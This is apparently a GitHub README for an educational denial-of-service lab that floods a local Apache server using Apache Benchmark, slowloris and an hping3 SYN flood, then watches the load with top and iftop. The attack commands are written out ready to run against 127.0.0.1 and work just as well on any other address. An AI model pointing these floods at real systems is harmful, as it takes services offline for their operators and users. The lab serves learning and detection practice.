# DDoS Attack Simulation Lab (Safe Environment)

This project simulates a Denial-of-Service (DoS) and basic DDoS-style attack in a controlled, offline lab environment for cybersecurity education. No external systems were harmed or targeted. This is a legal, ethical simulation for learning and documentation only.

---

## ⚠️ Legal Disclaimer

This project is for **educational use only**. Do not use any tools or scripts from this lab to attack public websites, networks, or systems without **explicit permission**.

##  Setup Requirements
```
- Kali Linux or Ubuntu VM
- Apache2 web server as target
- Tools: `ab`, `hping3`, `slowloris`
```
Install them:

```bash
sudo apt update
sudo apt install apache2 apache2-utils hping3 git -y
```
![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/0.png)

Install `slowloris`:

```bash
git clone https://github.com/gkbrk/slowloris
```

---

##  Step-by-Step Execution

### 1. Start the Target Server

```bash
sudo systemctl start apache2
```

Verify at: `http://127.0.0.1`

![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/1.png)

### 2. Launch the Attacks

Run each attack separately from `attack.sh` or manually.

#### A. Apache Benchmark

```bash
ab -n 1000 -c 100 http://127.0.0.1/ >> attack.log
```
![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/2.png)
#### B. Slowloris

```bash
python3 slowloris/slowloris.py 127.0.0.1 >> attack.log
```

#### C. hping3 SYN Flood

```bash
sudo hping3 -S 127.0.0.1 -p 80 --flood >> attack.log
```
![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/4.png)

(Interrupt with `Ctrl+C` after 5–10 sec)

---

##  Monitoring

While running attacks, open a second terminal and run:

```bash
top
htop
iftop -i lo
```
![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/5.png)
![DDoS Simulation Lab](https://raw.githubusercontent.com/mchyasn/cyber-Projs-beginner-to-advanced/main/IntermediateProjects/DDoS-Lab/screenshots/55.png)
## Educational Value

- Shows how stress on services impacts performance
- Simulates real-world traffic spikes (e.g., botnet flood)
- Trains for detection & response (IDS, logs, firewall tuning)

